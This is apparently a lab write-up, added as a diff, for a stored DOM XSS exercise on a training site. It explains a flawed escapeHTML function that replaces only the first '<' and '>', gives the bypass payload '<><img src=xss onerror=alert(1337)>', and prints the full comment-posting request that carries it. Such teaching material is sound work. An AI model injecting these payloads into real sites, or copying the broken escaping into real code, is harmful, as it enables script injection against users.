@@ -1,0 +1,32 @@
+Stored DOM XSS
+
+Checking the source page, we can observe that the comments go through a JS script:
+resources/js/loadCommentsWithVulnerableEscapeHtml.js
+
+Checking the script, there's a section that encodes < and >
+function escapeHTML(html) {
+    return html.replace('<', '&lt;').replace('>', '&gt;');
+}
+
+Fortunately, this only escapes the first occurance of those characters. The lab solution has a bit more in depth explanation
+
+At this point the payload is simple:
+
+<><img src=xss onerror=alert(1337)>
+
+Request:
+POST /post/comment HTTP/1.1
+Host: aca91f601f3c332b805a20d5003700d6.web-security-academy.net
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 147
+Origin: https://aca91f601f3c332b805a20d5003700d6.web-security-academy.net
+Connection: close
+Referer: https://aca91f601f3c332b805a20d5003700d6.web-security-academy.net/post?postId=4
+Cookie: session=HbHHnMdpGpAyHGDrYRDHKTbcpUsOWeBK
+Upgrade-Insecure-Requests: 1
+
+csrf=laaqCZqKvV7ZZuV4rra3fsqp04RBoFwI&postId=4&comment=%3C%3E%3Cimg+src%3Dxss+onerror%3Dalert%281337%29%3E&name=asdf&email=asdf%40asdf.com&website=
